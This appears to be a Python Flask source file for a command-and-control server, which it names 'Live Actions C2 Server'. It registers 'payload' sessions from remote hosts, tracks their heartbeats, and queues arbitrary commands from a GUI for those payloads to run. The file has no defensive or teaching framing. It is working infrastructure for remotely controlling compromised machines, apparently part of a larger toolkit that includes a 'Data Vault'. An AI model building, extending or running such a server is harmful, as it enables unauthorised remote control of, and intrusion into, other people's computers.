from flask import Flask, request, jsonify
import time
import threading

# --- Data Stores ---
SESSIONS = {}  # { "session_id": { ... session data ... } }
TASKS = {}     # { "session_id": [task1, task2] }

# Threading locks to prevent race conditions
sessions_lock = threading.Lock()
tasks_lock = threading.Lock()

app = Flask(__name__)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    session_id = data.get("session_id")
    if session_id:
        print(f"[*] New session online: {data.get('hostname')} ({session_id})")
        with sessions_lock:
            SESSIONS[session_id] = {
                "session_id": session_id,
                "hostname": data.get("hostname"),
                "last_seen": time.time()
            }
    return jsonify({"status": "ok"}), 200

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """
    Handles heartbeats from payloads.
    Crucially, it also sends back any queued tasks.
    """
    data = request.json
    session_id = data.get("session_id")
    tasks_for_session = []

    if session_id in SESSIONS:
        with sessions_lock:
            SESSIONS[session_id]["last_seen"] = time.time()
        
        # Check for tasks and pop them from the queue so they only run once
        with tasks_lock:
            if session_id in TASKS:
                tasks_for_session = TASKS.pop(session_id, [])

    return jsonify({"status": "ok", "tasks": tasks_for_session})

@app.route('/api/get_sessions', methods=['GET'])
def get_sessions():
    with sessions_lock:
        return jsonify(list(SESSIONS.values()))

@app.route('/api/task', methods=['POST'])
def task_session():
    """
    NEW: This is the endpoint our GUI will use to send a command to a payload.
    """
    data = request.json
    session_id = data.get("session_id")
    command = data.get("command")
    args = data.get("args", {})

    if not all([session_id, command]):
        return jsonify({"status": "error", "message": "Missing session_id or command"}), 400

    if session_id not in SESSIONS:
        return jsonify({"status": "error", "message": "Session not found"}), 404

    task = {"command": command, "args": args}
    
    with tasks_lock:
        TASKS.setdefault(session_id, []).append(task)
    
    print(f"[*] Task '{command}' queued for session {session_id}")
    return jsonify({"status": "tasked"})

def run_server():
    # Running on a new port to avoid conflicts with the Data Vault
    app.run(host='0.0.0.0', port=5003)

if __name__ == '__main__':
    print("[*] Live Actions C2 Server starting...")
    run_server()